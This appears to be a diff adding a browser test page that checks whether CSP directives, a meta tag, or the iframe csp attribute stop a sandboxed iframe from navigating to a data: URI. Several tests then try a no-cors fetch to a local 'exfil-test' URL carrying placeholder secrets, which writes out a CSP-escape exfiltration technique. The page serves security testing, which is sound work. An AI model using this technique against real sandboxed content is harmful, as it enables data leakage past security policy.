@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head><title>Round 8: Can we block data: URI navigation?</title></head>
+<body>
+<h1>Round 8: Blocking data: URI navigation from sandboxed iframes</h1>
+<p>Testing CSP directives that could prevent navigation to data: URIs</p>
+<div id="results"></div>
+
+<h2>Test 57: navigate-to CSP directive (experimental)</h2>
+<iframe id="test57" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; navigate-to 'none';&quot;>
+  <script>
+    try {
+      location.href = 'data:text/html,<script>parent.postMessage({test:57,result:&quot;FAIL - navigated despite navigate-to none&quot;},&quot;*&quot;)<\/script>';
+    } catch(e) {
+      parent.postMessage({test: 57, result: 'PASS - navigation blocked: ' + e.message}, '*');
+    }
+    setTimeout(() => parent.postMessage({test: 57, result: 'PASS - navigation did not occur (timeout)'}, '*'), 3000);
+  </script>
+"></iframe>
+
+<h2>Test 58: CSP with frame-src 'none' (blocks child frames, not self-navigation)</h2>
+<iframe id="test58" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; frame-src 'none';&quot;>
+  <script>
+    try {
+      location.href = 'data:text/html,<script>parent.postMessage({test:58,result:&quot;frame-src none did NOT block data: nav&quot;},&quot;*&quot;)<\/script>';
+    } catch(e) {
+      parent.postMessage({test: 58, result: 'blocked: ' + e.message}, '*');
+    }
+    setTimeout(() => parent.postMessage({test: 58, result: 'timeout'}, '*'), 3000);
+  </script>
+"></iframe>
+
+<h2>Test 59: sandbox without allow-top-navigation (already default)</h2>
+<p>sandbox="allow-scripts" already doesn't include allow-top-navigation.
+Does it also prevent self-navigation to data: URIs?</p>
+<iframe id="test59" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    try {
+      window.location = 'data:text/html,<script>parent.postMessage({test:59,result:&quot;self-navigation to data: URI succeeded&quot;},&quot;*&quot;)<\/script>';
+    } catch(e) {
+      parent.postMessage({test: 59, result: 'blocked: ' + e.message}, '*');
+    }
+    setTimeout(() => parent.postMessage({test: 59, result: 'timeout'}, '*'), 3000);
+  </script>
+"></iframe>
+
+<h2>Test 60: CSP with default-src 'none' + no-cors fetch from data: URI</h2>
+<p>Re-test: CSP meta -> data: URI nav -> no-cors fetch. Does the CSP really persist?</p>
+<iframe id="test60" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-60?secret=CSP_PERSIST_CHECK&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:60,result:&quot;no-cors type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:60,result:&quot;blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 61: CSP with connect-src 'none' -> data: URI -> no-cors fetch</h2>
+<iframe id="test61" sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-61?secret=CONNECT_SRC_PERSIST&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:61,result:&quot;no-cors type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:61,result:&quot;blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 62: Use the iframe csp attribute (Option 1) to block data: nav escape</h2>
+<iframe id="test62" sandbox="allow-scripts"
+  csp="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';"
+  srcdoc="
+  <script>
+    location.href = 'data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-62?secret=CSP_ATTR_CHECK&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:62,result:&quot;csp attr - no-cors type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:62,result:&quot;csp attr - blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+  </script>
+"></iframe>
+
+<h2>Test 63: Both csp attribute AND meta tag -> data: URI -> no-cors fetch</h2>
+<iframe id="test63" sandbox="allow-scripts"
+  csp="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';"
+  srcdoc="
+  <meta http-equiv='Content-Security-Policy'
+        content=&quot;default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';&quot;>
+  <script>
+    location.href = 'data:text/html,<script>fetch(&quot;http://localhost:8000/exfil-test-63?secret=BOTH_CSP_CHECK&quot;,{mode:&quot;no-cors&quot;}).then(function(r){parent.postMessage({test:63,result:&quot;both csp - no-cors type: &quot;+r.type},&quot;*&quot;)}).catch(function(e){parent.postMessage({test:63,result:&quot;both csp - blocked: &quot;+e.message},&quot;*&quot;)})<\/script>';
+  </script>
+"></iframe>
+
+<script>
+  const results = {};
+  const testIds = [57,58,59,60,61,62,63];
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.test) {
+      results[e.data.test] = e.data.result;
+      const div = document.getElementById('results');
+      div.innerHTML = '<h2>Results So Far</h2><pre>' +
+        Object.entries(results)
+          .sort(([a],[b]) => a-b)
+          .map(([k,v]) => 'Test ' + k + ': ' + v)
+          .join('\n') +
+        '</pre>';
+      if (Object.keys(results).length >= testIds.length) {
+        window.__allDone = true;
+        div.innerHTML += '<p><strong>ALL TESTS COMPLETE</strong></p>';
+      }
+    }
+  });
+
+  setTimeout(() => {
+    for (const i of testIds) {
+      if (!results[i]) results[i] = 'TIMEOUT - no response received';
+    }
+    const div = document.getElementById('results');
+    div.innerHTML = '<h2>Final Results</h2><pre>' +
+      Object.entries(results)
+        .sort(([a],[b]) => a-b)
+        .map(([k,v]) => 'Test ' + k + ': ' + v)
+        .join('\n') +
+      '</pre><p><strong>ALL TESTS COMPLETE</strong></p>';
+    window.__allDone = true;
+  }, 10000);
+</script>
+</body>
+</html>
